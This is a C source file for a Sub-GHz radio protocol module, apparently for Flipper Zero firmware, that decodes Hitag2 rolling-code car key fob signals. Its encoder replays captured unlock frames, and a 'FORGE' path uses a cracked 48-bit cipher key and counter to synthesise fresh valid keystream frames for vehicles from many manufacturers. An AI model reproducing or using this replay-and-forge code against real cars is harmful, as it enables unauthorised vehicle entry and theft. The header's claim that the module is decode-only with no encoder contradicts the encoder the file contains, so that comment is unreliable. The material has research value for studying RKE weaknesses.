/**
 * Hitag2 RKE — NXP PCF7946/7947 Rolling-Code Remote Keyless Entry
 *
 * Reference: Garcia, Oswald, Kasper, Pavlidès,
 *   "Lock It and Still Lose It — On the (In)Security of Automotive RKE Systems",
 *   USENIX Security 2016, Figure 11.
 *
 * Used by many manufacturers (Alfa Romeo, Citroën, Dacia, Fiat, Ford, Lancia,
 * Mitsubishi, Nissan, Opel/Vauxhall, Peugeot, Renault, …). Cipher = Hitag2
 * (48-bit LFSR + nonlinear filter). The rolling code can be recovered with the
 * fast correlation attack in tools/hitag2/hitag2_crack.{c,py} from ≥4 traces.
 *
 * Physical (verified on Ford Ka 2016, 433.92 MHz OOK):
 *   Manchester, te_short≈240us / te_long≈480us (G.E. Thomas).
 *   Preamble: run of 1-bits (carrier sync).
 *
 * Packet (103 bits, Figure 11):
 *   [marker 16b][UID 32b][btn 4b][lctr 10b][ks 32b][0 1b][chk 8b]
 *   - UID  : 32-bit identifier, constant per remote
 *   - btn  : 4-bit button id (Ford Ka: 0x3=Lock, 0x5=Unlock, 0x9=Trunk)
 *   - lctr : low 10 bits of the 28-bit rolling counter (cleartext, increments)
 *   - ks   : 32-bit Hitag2 keystream (the encrypted rolling part)
 *   - chk  : XOR-parity over the 10 bytes preceding it (bits 15..94)
 *
 * Sync is self-validating via the checksum: a frame is accepted only where the
 * XOR of 10 consecutive bytes equals the following byte. This removes the
 * ±1-bit preamble-length ambiguity inherent to a variable-length carrier run.
 *
 * Decode-only (dev): the rolling code is encrypted with a per-remote key, so
 * there is no roundtrip encoder.
 */

#include "hitag2.h"
#include "hitag2_cipher.h"

#include "../blocks/const.h"
#include "../blocks/decoder.h"
#include "../blocks/encoder.h"
#include "../blocks/generic.h"
#include "../blocks/math.h"

#include <furi.h>
#include <furi_hal.h>

#define TAG "SubGhzProtocolHitag2"

#define HITAG2_DATA_BITS     103
#define HITAG2_ALL_BITS_MAX  400
/* checksum spans 10 bytes; smallest acceptable frame = checksum window + chk */
#define HITAG2_MIN_BITS      88
/* carrier-preamble 1-bits required immediately before the frame (anti-alias) */
#define HITAG2_PREAMBLE_MIN  14
/* carrier 1-bits that must sit immediately before the 0x0001 marker word — turns
 * the marker into a real value check instead of a bare preamble->data boundary.
 * Kept < HITAG2_TX_PREAMBLE (12) so the encoder's own frames still decode. */
#define HITAG2_MARKER_PREAMBLE 6
/* raw-pulse buffer per burst (Manchester ≈ 1.5 pulses/bit + preamble) */
#define HITAG2_MAXDUR        700
/* a space longer than this ends a burst (longer than any te_long across the
 * 90..260µs bitrate range we support) */
#define HITAG2_GAP           1500
#define HITAG2_MIN_PULSE     30
/* te_short search window for the per-burst histogram (µs) */
#define HITAG2_TE_MIN        70
#define HITAG2_TE_MAX        320

static const SubGhzBlockConst subghz_protocol_hitag2_const = {
    .te_short = 240,
    .te_long = 480,
    .te_delta = 120,
    .min_count_bit_for_found = HITAG2_MIN_BITS,
};

// ============================================================================
// DATA STRUCTURES
// ============================================================================

struct SubGhzProtocolDecoderHitag2 {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;

    // Raw signed pulse durations of the current burst (+ = high, - = low).
    // te_short is estimated per burst, so a single decoder handles the whole
    // Hitag2 bitrate range (te≈90µs Fiat/Alfa .. te≈240µs Ford Ka).
    int16_t durs[HITAG2_MAXDUR];
    uint16_t dur_count;

    // Scratch demodulated bits (filled per polarity in process()).
    uint8_t all_bits[HITAG2_ALL_BITS_MAX];

    uint32_t uid;   // 32-bit identifier
    uint8_t  btn;   // 4-bit button id
    uint16_t lctr;  // 10-bit cleartext counter (low bits)
    uint32_t ks;    // 32-bit keystream
    uint8_t  chk;   // 8-bit parity byte
};

struct SubGhzProtocolEncoderHitag2 {
    SubGhzProtocolEncoderBase base;
    SubGhzProtocolBlockEncoder encoder;
    SubGhzBlockGeneric generic;
};

// ============================================================================
// HELPERS
// ============================================================================

static uint32_t hitag2_bits_to_int(const uint8_t* bits, int lo, int len) {
    uint32_t v = 0;
    for(int i = 0; i < len; i++) v = (v << 1) | (bits[lo + i] & 1);
    return v;
}

// ============================================================================
// FRAME PROCESSING — checksum-validated sync
//
// For a candidate start position 'cs' (= bit 15 of the packet, one bit before
// the UID), the byte-XOR parity over bytes [cs .. cs+80) must equal the byte at
// [cs+80 .. cs+88). When it matches, the fields are extracted relative to cs:
//   UID  = bits[cs+1  .. cs+33]
//   btn  = bits[cs+33 .. cs+37]
//   lctr = bits[cs+37 .. cs+47]
//   ks   = bits[cs+47 .. cs+79]
//   chk  = bits[cs+80 .. cs+88]
// ============================================================================

static bool subghz_protocol_decoder_hitag2_find_and_emit(
    SubGhzProtocolDecoderHitag2* instance, int n) {
    const uint8_t* b = instance->all_bits;
    if(n < HITAG2_MIN_BITS) return false;

    for(int cs = 0; cs + 88 <= n; cs++) {
        // (1) require the fixed '0' bit between ks and chk (Figure 11)
        if(b[cs + 79] != 0) continue;

        // (2) verify the real sync in carrier context: HITAG2_MARKER_PREAMBLE
        //     carrier 1-bits immediately followed by the 16-bit marker WORD 0x0001
        //     (Figure 11). The marker ends at cs (bits[cs-15..cs]); cs is the last
        //     pre-UID bit, UID starts at cs+1. A bare 15-zero-then-1 run is emitted
        //     by ANY preamble->data boundary (that alias let a Honda RKE burst in);
        //     requiring genuine carrier 1-bits before the marker's zero field pins
        //     polarity and makes 0x0001 a real value check, not a run length.
        if(cs < 15 + HITAG2_MARKER_PREAMBLE) continue;
        uint16_t marker = (uint16_t)hitag2_bits_to_int(b, cs - 15, 16);
        if(marker != 0x0001) continue;
        bool preamble_ok = true;
        for(int j = 1; j <= HITAG2_MARKER_PREAMBLE; j++) {
            if(b[cs - 15 - j] != 1) { preamble_ok = false; break; }
        }
        if(!preamble_ok) continue;

        // First structurally-aligned candidate for this polarity (0-bit + carrier
        // + marker). Validate it ONCE and stop — do NOT slide to further offsets.
        // The old every-offset re-scan ran the 1/256 XOR-parity test hundreds of
        // times per burst, which is what produced the accidental matches (#27).
        // From here a failed check returns false instead of continuing the scan.

        // (3) XOR-parity checksum over the 10 bytes preceding chk
        uint8_t x = 0;
        for(int i = cs; i < cs + 80; i += 8) {
            x ^= (uint8_t)hitag2_bits_to_int(b, i, 8);
        }
        uint8_t chk = (uint8_t)hitag2_bits_to_int(b, cs + 80, 8);
        if(x != chk) return false;

        // (4) reject the all-zero / all-one UID — a real remote never has it,
        //     and an empty bit run trivially satisfies the XOR-parity.
        uint32_t uid = hitag2_bits_to_int(b, cs + 1, 32);
        if(uid == 0 || uid == 0xFFFFFFFF) return false;

        // Valid Hitag2 frame at cs
        instance->uid = uid;
        instance->btn = (uint8_t)hitag2_bits_to_int(b, cs + 33, 4);
        instance->lctr = (uint16_t)hitag2_bits_to_int(b, cs + 37, 10);
        instance->ks = hitag2_bits_to_int(b, cs + 47, 32);
        instance->chk = chk;

        // (5) lctr/keystream plausibility bound: a genuine rolling frame never
        //     carries an all-zero or all-one counter+keystream (a demod artefact,
        //     not a real remote). Part of the single-shot validation: reject.
        if((instance->lctr == 0 && instance->ks == 0) ||
           (instance->lctr == 0x3FF && instance->ks == 0xFFFFFFFF)) {
            return false;
        }

        // generic.data = first 64 bits from UID (UID:32 | btn:4 | lctr:10 | ks_hi:18)
        instance->generic.data = ((uint64_t)instance->uid << 32) |
                                 ((uint64_t)(instance->btn & 0xF) << 28) |
                                 ((uint64_t)(instance->lctr & 0x3FF) << 18) |
                                 (uint64_t)(instance->ks >> 14);
        instance->generic.data_count_bit = HITAG2_DATA_BITS;
        instance->generic.serial = instance->uid;
        instance->generic.btn = instance->btn;
        instance->generic.cnt = instance->lctr;

        instance->decoder.decode_data = instance->generic.data;
        instance->decoder.decode_count_bit = HITAG2_DATA_BITS;

        FURI_LOG_I(
            TAG,
            "Hitag2: UID=%08lX btn=%X lctr=%03X ks=%08lX chk=%02X",
            (unsigned long)instance->uid,
            instance->btn,
            instance->lctr,
            (unsigned long)instance->ks,
            instance->chk);

        if(instance->base.callback) {
            instance->base.callback(&instance->base, instance->base.context);
        }
        return true;
    }
    return false;
}

// ============================================================================
// Per-burst te_short estimation + Manchester demodulation.
//
// Hitag2 RKE bitrate varies a lot by manufacturer (te≈90µs Fiat/Alfa ..
// te≈240µs Ford Ka). Instead of a fixed timing we estimate te_short from a
// histogram of the burst's pulse widths (the half-bit is the most common
// pulse), then run a stateless G.E.-Thomas Manchester decode. Both polarities
// are tried; the first that yields a checksum-valid frame wins.
// ============================================================================

static uint32_t hitag2_estimate_te(const int16_t* durs, int count) {
    // 10µs-bin histogram over the plausible te_short window; return the
    // most populated bin center.
    enum { BINS = (HITAG2_TE_MAX - HITAG2_TE_MIN) / 10 + 1 };
    uint16_t hist[BINS];
    for(int i = 0; i < BINS; i++) hist[i] = 0;
    for(int i = 0; i < count; i++) {
        int d = durs[i] < 0 ? -durs[i] : durs[i];
        if(d < HITAG2_TE_MIN || d > HITAG2_TE_MAX) continue;
        hist[(d - HITAG2_TE_MIN) / 10]++;
    }
    int best = 0;
    for(int i = 1; i < BINS; i++)
        if(hist[i] > hist[best]) best = i;
    return (uint32_t)(HITAG2_TE_MIN + best * 10 + 5);
}

static int hitag2_demod(
    const int16_t* durs, int count, uint32_t te_short, bool polarity, uint8_t* out) {
    uint32_t te_long = 2 * te_short;
    uint32_t delta = te_short * 45 / 100;
    if(delta < 40) delta = 40;
    int n = 0;
    bool half = false;
    for(int i = 0; i < count && n < HITAG2_ALL_BITS_MAX - 1; i++) {
        bool level = durs[i] > 0;
        uint32_t d = durs[i] < 0 ? (uint32_t)(-durs[i]) : (uint32_t)durs[i];
        bool is_long = DURATION_DIFF(d, te_long) <= delta;
        bool is_short = DURATION_DIFF(d, te_short) <= delta;
        uint8_t bl = polarity ? (level ? 1 : 0) : (level ? 0 : 1);
        if(is_long) {
            out[n++] = bl;
            half = false;
        } else if(is_short) {
            if(half) {
                out[n++] = bl;
                half = false;
            } else {
                half = true;
            }
        } else {
            half = false; // noise/invalid: drop, keep scanning (checksum re-syncs)
        }
    }
    return n;
}

static void subghz_protocol_decoder_hitag2_process_burst(SubGhzProtocolDecoderHitag2* instance) {
    if(instance->dur_count < HITAG2_MIN_BITS) return;
    uint32_t te = hitag2_estimate_te(instance->durs, instance->dur_count);
    for(int pol = 0; pol < 2; pol++) {
        int n = hitag2_demod(instance->durs, instance->dur_count, te, pol != 0, instance->all_bits);
        if(subghz_protocol_decoder_hitag2_find_and_emit(instance, n)) return;
    }
    FURI_LOG_D(TAG, "No Hitag2 frame in burst (%d pulses, te≈%lu)",
        instance->dur_count, (unsigned long)te);
}

// ============================================================================
// DECODER: feed — collect raw burst pulses, decode on the trailing gap.
// ============================================================================

void subghz_protocol_decoder_hitag2_feed(void* context, bool level, uint32_t duration) {
    furi_assert(context);
    SubGhzProtocolDecoderHitag2* instance = context;

    if(duration >= HITAG2_GAP) {
        // burst boundary
        subghz_protocol_decoder_hitag2_process_burst(instance);
        instance->dur_count = 0;
        return;
    }
    if(duration < HITAG2_MIN_PULSE) {
        return; // ignore glitches without breaking the burst
    }
    if(instance->dur_count >= HITAG2_MAXDUR) {
        subghz_protocol_decoder_hitag2_process_burst(instance);
        instance->dur_count = 0;
    }
    int32_t v = (int32_t)duration;
    if(v > 32000) v = 32000;
    instance->durs[instance->dur_count++] = (int16_t)(level ? v : -v);
}

// ============================================================================
// PROTOCOL VTABLES
// ============================================================================

static SubGhzBlockGeneric* subghz_protocol_decoder_hitag2_get_generic(void* context) {
    SubGhzProtocolDecoderHitag2* instance = context;
    return &instance->generic;
}

const SubGhzProtocolDecoder subghz_protocol_hitag2_decoder = {
    .alloc = subghz_protocol_decoder_hitag2_alloc,
    .free = subghz_protocol_decoder_hitag2_free,
    .feed = subghz_protocol_decoder_hitag2_feed,
    .reset = subghz_protocol_decoder_hitag2_reset,
    .get_hash_data = subghz_protocol_decoder_hitag2_get_hash_data,
    .serialize = subghz_protocol_decoder_hitag2_serialize,
    .deserialize = subghz_protocol_decoder_hitag2_deserialize,
    .get_string = subghz_protocol_decoder_hitag2_get_string,
    .get_generic = subghz_protocol_decoder_hitag2_get_generic,
};

const SubGhzProtocolEncoder subghz_protocol_hitag2_encoder = {
    .alloc = subghz_protocol_encoder_hitag2_alloc,
    .free = subghz_protocol_encoder_hitag2_free,
    .deserialize = subghz_protocol_encoder_hitag2_deserialize,
    .stop = subghz_protocol_encoder_hitag2_stop,
    .yield = subghz_protocol_encoder_hitag2_yield,
};

const SubGhzProtocol subghz_protocol_hitag2 = {
    .name = SUBGHZ_PROTOCOL_HITAG2_NAME,
    .type = SubGhzProtocolTypeDynamic,
    .flag = SubGhzProtocolFlag_433 | SubGhzProtocolFlag_AM |
            SubGhzProtocolFlag_Decodable |
            SubGhzProtocolFlag_Load | SubGhzProtocolFlag_Save | SubGhzProtocolFlag_Send,
    .decoder = &subghz_protocol_hitag2_decoder,
    .encoder = &subghz_protocol_hitag2_encoder,
};

// ============================================================================
// DECODER: alloc / free / reset
// ============================================================================

void* subghz_protocol_decoder_hitag2_alloc(SubGhzEnvironment* environment) {
    UNUSED(environment);
    SubGhzProtocolDecoderHitag2* instance = malloc(sizeof(SubGhzProtocolDecoderHitag2));
    instance->base.protocol = &subghz_protocol_hitag2;
    instance->generic.protocol_name = instance->base.protocol->name;
    return instance;
}

void subghz_protocol_decoder_hitag2_free(void* context) {
    furi_assert(context);
    SubGhzProtocolDecoderHitag2* instance = context;
    free(instance);
}

void subghz_protocol_decoder_hitag2_reset(void* context) {
    furi_assert(context);
    SubGhzProtocolDecoderHitag2* instance = context;
    instance->decoder.parser_step = 0;
    instance->decoder.te_last = 0;
    instance->decoder.decode_data = 0;
    instance->decoder.decode_count_bit = 0;
    instance->dur_count = 0;
    instance->generic.data_count_bit = 0;
}

// ============================================================================
// DECODER: hash / serialize / deserialize
// ============================================================================

uint8_t subghz_protocol_decoder_hitag2_get_hash_data(void* context) {
    furi_assert(context);
    SubGhzProtocolDecoderHitag2* instance = context;
    return subghz_protocol_blocks_get_hash_data(
        &instance->decoder, (instance->decoder.decode_count_bit / 8) + 1);
}

SubGhzProtocolStatus subghz_protocol_decoder_hitag2_serialize(
    void* context,
    FlipperFormat* flipper_format,
    SubGhzRadioPreset* preset) {
    furi_assert(context);
    SubGhzProtocolDecoderHitag2* instance = context;
    SubGhzProtocolStatus ret =
        subghz_block_generic_serialize(&instance->generic, flipper_format, preset);
    if(ret == SubGhzProtocolStatusOk) {
        uint32_t ks = instance->ks;
        flipper_format_write_uint32(flipper_format, "Ks", &ks, 1);
    }
    return ret;
}

SubGhzProtocolStatus
    subghz_protocol_decoder_hitag2_deserialize(void* context, FlipperFormat* flipper_format) {
    furi_assert(context);
    SubGhzProtocolDecoderHitag2* instance = context;
    // Stored data_count_bit is always HITAG2_DATA_BITS (103); check against that,
    // not min_count_bit_for_found (88, the decode threshold) — the helper demands
    // exact equality and would otherwise reject every saved hitag2 capture.
    SubGhzProtocolStatus ret = subghz_block_generic_deserialize_check_count_bit(
        &instance->generic, flipper_format, HITAG2_DATA_BITS);
    if(ret == SubGhzProtocolStatusOk) {
        uint32_t ks = 0;
        flipper_format_read_uint32(flipper_format, "Ks", &ks, 1);
        instance->ks = ks;
        // generic serialize/deserialize only round-trips data_count_bit + data,
        // NOT serial/btn/cnt. Re-derive uid/btn/lctr from the packed 64-bit data
        // (UID:32 | btn:4 | lctr:10 | ks_hi:18) so a reloaded capture isn't corrupt.
        instance->uid = (uint32_t)(instance->generic.data >> 32);
        instance->btn = (uint8_t)((instance->generic.data >> 28) & 0x0F);
        instance->lctr = (uint16_t)((instance->generic.data >> 18) & 0x03FF);
    }
    return ret;
}

// ============================================================================
// DECODER: get_string
// ============================================================================

static const char* hitag2_btn_name(uint8_t btn) {
    // Ford Ka mapping; other manufacturers may differ.
    switch(btn) {
    case 0x3: return "Lock";
    case 0x5: return "Unlock";
    case 0x9: return "Trunk";
    default: return "?";
    }
}

void subghz_protocol_decoder_hitag2_get_string(void* context, FuriString* output) {
    furi_assert(context);
    SubGhzProtocolDecoderHitag2* instance = context;

    furi_string_cat_printf(
        output,
        "%s %dbit\r\n"
        "Key:%016llX\r\n"
        "Sn:%08lX Btn:%X [%s]\r\n"
        "Cnt:%03X Hop:%08lX Chk:%02X",
        instance->generic.protocol_name,
        instance->generic.data_count_bit,
        (unsigned long long)instance->generic.data,
        (unsigned long)instance->uid,
        instance->btn,
        hitag2_btn_name(instance->btn),
        instance->lctr,
        (unsigned long)instance->ks,
        instance->chk);
}

// ============================================================================
// ENCODER — faithful bit-replay of the captured frame.
//
// The decoder stores UID:32|btn:4|lctr:10|ks_hi:18 in generic.data and the full
// 32-bit keystream in the separate "Ks" field. That is everything needed to
// rebuild the exact 103-bit logical packet the decoder framed:
//   [marker 0x0001 :16][UID :32][btn :4][lctr :10][ks :32][0 :1][chk :8]
// chk is the byte-XOR parity the decoder validates, so it is recomputed here
// (deterministic) rather than stored.
//
// Line code: the decoder's hitag2_demod() treats one te_long pulse OR a pair of
// te_short pulses as one bit (value = level of the long / of the 2nd short under
// a per-burst polarity, tried both ways). A merged-Manchester waveform desyncs
// that demod (a long straddling a bit boundary is misread), so instead the frame
// is emitted directly in the demod's own symbol space: walking an alternating
// pulse-level stream, each output bit v is a LONG when the next level already
// equals v, otherwise a SHORT pair whose 2nd pulse carries v. This keeps the
// demod's half-bit phase aligned for every bit (verified by simulation against a
// port of hitag2_demod + find_and_emit over 50k random frames -> exact match).
// A short run of 1-preamble bits precedes the frame; the checksum-slide in
// find_and_emit then locks onto the marker with no false alias.
// ============================================================================

#define HITAG2_TX_PREAMBLE 12 /* leading 1-bits (carrier); <=12 avoids find_and_emit aliasing */
#define HITAG2_TX_BITS     (HITAG2_TX_PREAMBLE + HITAG2_DATA_BITS)
/* worst case: 2 pulses/bit + trailing gap */
#define HITAG2_TX_UPLOAD   (HITAG2_TX_BITS * 2 + 2)

void* subghz_protocol_encoder_hitag2_alloc(SubGhzEnvironment* environment) {
    UNUSED(environment);
    SubGhzProtocolEncoderHitag2* instance = malloc(sizeof(SubGhzProtocolEncoderHitag2));
    instance->base.protocol = &subghz_protocol_hitag2;
    instance->generic.protocol_name = instance->base.protocol->name;
    instance->encoder.repeat = 4;
    instance->encoder.size_upload = HITAG2_TX_UPLOAD;
    instance->encoder.upload = malloc(HITAG2_TX_UPLOAD * sizeof(LevelDuration));
    instance->encoder.is_running = false;
    return instance;
}

void subghz_protocol_encoder_hitag2_free(void* context) {
    furi_assert(context);
    SubGhzProtocolEncoderHitag2* instance = context;
    free(instance->encoder.upload);
    free(instance);
}

static uint8_t hitag2_bits_byte(const uint8_t* bits, int lo) {
    uint8_t v = 0;
    for(int i = 0; i < 8; i++) v = (uint8_t)((v << 1) | (bits[lo + i] & 1));
    return v;
}

// Build the full logical output-bit array (preamble + 103-bit packet).
static void subghz_protocol_encoder_hitag2_build_bits(
    SubGhzProtocolEncoderHitag2* instance, uint8_t* out) {
    uint32_t uid = (uint32_t)(instance->generic.data >> 32);
    uint8_t btn = (uint8_t)((instance->generic.data >> 28) & 0x0F);
    uint16_t lctr = (uint16_t)((instance->generic.data >> 18) & 0x03FF);
    uint32_t ks = instance->generic.cnt; // Ks stashed here by deserialize

    int idx = 0;
    for(int p = 0; p < HITAG2_TX_PREAMBLE; p++) out[idx++] = 1;

    int base = idx; // index of packet bit 0 (marker MSB)
    for(int j = 0; j < 16; j++) out[idx++] = (uint8_t)((0x0001u >> (15 - j)) & 1); // marker
    for(int i = 31; i >= 0; i--) out[idx++] = (uint8_t)((uid >> i) & 1); // UID
    for(int i = 3; i >= 0; i--) out[idx++] = (uint8_t)((btn >> i) & 1); // btn
    for(int i = 9; i >= 0; i--) out[idx++] = (uint8_t)((lctr >> i) & 1); // lctr
    for(int i = 31; i >= 0; i--) out[idx++] = (uint8_t)((ks >> i) & 1); // ks
    out[idx++] = 0; // fixed 0 between ks and chk

    // chk = XOR-parity of the 10 bytes spanning packet bits 15..94
    uint8_t chk = 0;
    for(int i = base + 15; i < base + 95; i += 8) chk ^= hitag2_bits_byte(out, i);
    for(int i = 7; i >= 0; i--) out[idx++] = (uint8_t)((chk >> i) & 1); // chk
}

static void subghz_protocol_encoder_hitag2_get_upload(SubGhzProtocolEncoderHitag2* instance) {
    uint8_t bits[HITAG2_TX_BITS];
    subghz_protocol_encoder_hitag2_build_bits(instance, bits);

    const uint32_t te_short = (uint32_t)subghz_protocol_hitag2_const.te_short;
    const uint32_t te_long = (uint32_t)subghz_protocol_hitag2_const.te_long;
    const size_t enc_cap = HITAG2_TX_UPLOAD;

    size_t k = 0;
    bool lvl = true; // first pulse high
    for(int i = 0; i < HITAG2_TX_BITS; i++) {
        uint8_t v = bits[i];
        if((lvl ? 1 : 0) == v) {
            if(k < enc_cap) instance->encoder.upload[k++] = level_duration_make(lvl, te_long);
            lvl = !lvl;
        } else {
            if(k < enc_cap) instance->encoder.upload[k++] = level_duration_make(lvl, te_short);
            lvl = !lvl;
            if(k < enc_cap) instance->encoder.upload[k++] = level_duration_make(lvl, te_short);
            lvl = !lvl;
        }
    }
    // Trailing gap so each (repeated) frame ends on a burst boundary. Emit it at
    // the OPPOSITE level from the last data pulse: on a real radio (and under the
    // merge-aware harness) adjacent same-level entries coalesce into one pulse, so
    // a LOW gap following a LOW final pulse would fuse into a single >= HITAG2_GAP
    // space. feed() ends the burst on that space WITHOUT recording the final pulse,
    // dropping the last half-bit — the chk byte then fails the checksum and the
    // frame is lost. An opposite-level gap keeps the completing pulse in the burst.
    if(k < enc_cap) {
        bool last_level = level_duration_get_level(instance->encoder.upload[k - 1]);
        instance->encoder.upload[k++] = level_duration_make(!last_level, HITAG2_GAP * 4);
    }
    instance->encoder.size_upload = k;
}

SubGhzProtocolStatus
    subghz_protocol_encoder_hitag2_deserialize(void* context, FlipperFormat* flipper_format) {
    furi_assert(context);
    SubGhzProtocolEncoderHitag2* instance = context;
    SubGhzProtocolStatus res = SubGhzProtocolStatusError;
    do {
        // NB: use the plain deserialize (not *_check_count_bit) — that helper
        // demands data_count_bit == the passed value, but hitag2 stores 103 bits
        // while min_count_bit_for_found is 88.
        if(subghz_block_generic_deserialize(&instance->generic, flipper_format) !=
           SubGhzProtocolStatusOk) {
            FURI_LOG_E(TAG, "Deserialize error");
            break;
        }
        if(instance->generic.data_count_bit != HITAG2_DATA_BITS) {
            FURI_LOG_E(TAG, "Invalid bit count: %u", (unsigned)instance->generic.data_count_bit);
            res = SubGhzProtocolStatusErrorValueBitCount;
            break;
        }
        // generic (de)serialize round-trips only data + data_count_bit; the 32-bit
        // keystream lives in its own "Ks" field. Stash it in generic.cnt for the
        // upload builder (uid/btn/lctr come from generic.data directly).
        uint32_t ks = 0;
        flipper_format_read_uint32(flipper_format, "Ks", &ks, 1);
        instance->generic.cnt = ks;

        // FORGE (known-key emulation): if the .sub carries a 48-bit "Hitag2Key" + a full
        // 28-bit "Counter", generate the keystream a genuine fob would transmit for that
        // counter and patch it in (lctr = counter's low 10 bits, Ks = computed by the
        // cipher), instead of replaying the captured Ks. The key comes from offline
        // recovery / the shared LF immobilizer side, and Counter from hitag2_recover_counter
        // (which also proves the key). Field is "Hitag2Key" — NOT "Key", which the generic
        // serialize already uses for the 64-bit frame data. No key field -> faithful replay.
        static int ht2_cipher_ok = -1;
        if(ht2_cipher_ok < 0) ht2_cipher_ok = hitag2_selftest() ? 1 : 0; // refuse forge if broken
        uint8_t key_bytes[6] = {0};
        flipper_format_rewind(flipper_format);
        if(ht2_cipher_ok &&
           flipper_format_read_hex(flipper_format, "Hitag2Key", key_bytes, sizeof(key_bytes))) {
            uint64_t key = 0;
            for(size_t i = 0; i < sizeof(key_bytes); i++) key = (key << 8) | key_bytes[i];
            uint32_t counter = 0;
            flipper_format_rewind(flipper_format);
            // Forge only when the capture carries a Counter. Without it we cannot know
            // which frame in the sequence to synthesize, so forging with counter=0 would
            // emit an out-of-window Ks the receiver rejects. Fall back to faithful replay
            // of the captured Ks (instance->generic.cnt is left as serialized).
            if(flipper_format_read_uint32(flipper_format, "Counter", &counter, 1)) {
                uint32_t uid = (uint32_t)(instance->generic.data >> 32);
                uint8_t btn = (uint8_t)((instance->generic.data >> 28) & 0x0F);
                instance->generic.cnt = hitag2_rke_ks(key, uid, counter, btn); // forged Ks
                uint16_t lctr = (uint16_t)(counter & 0x03FFu);
                instance->generic.data =
                    (instance->generic.data & ~((uint64_t)0x03FFu << 18)) | ((uint64_t)lctr << 18);
            }
        }

        instance->generic.protocol_name = instance->base.protocol->name;
        subghz_protocol_encoder_hitag2_get_upload(instance);
        instance->encoder.front = 0;
        instance->encoder.is_running = true;
        res = SubGhzProtocolStatusOk;
    } while(false);
    return res;
}

void subghz_protocol_encoder_hitag2_stop(void* context) {
    SubGhzProtocolEncoderHitag2* instance = context;
    instance->encoder.is_running = false;
}

LevelDuration subghz_protocol_encoder_hitag2_yield(void* context) {
    SubGhzProtocolEncoderHitag2* instance = context;
    if(instance->encoder.repeat == 0 || !instance->encoder.is_running) {
        instance->encoder.is_running = false;
        return level_duration_reset();
    }
    LevelDuration ret = instance->encoder.upload[instance->encoder.front];
    if(++instance->encoder.front == instance->encoder.size_upload) {
        if(!subghz_block_generic_global.endless_tx) instance->encoder.repeat--;
        instance->encoder.front = 0;
    }
    return ret;
}
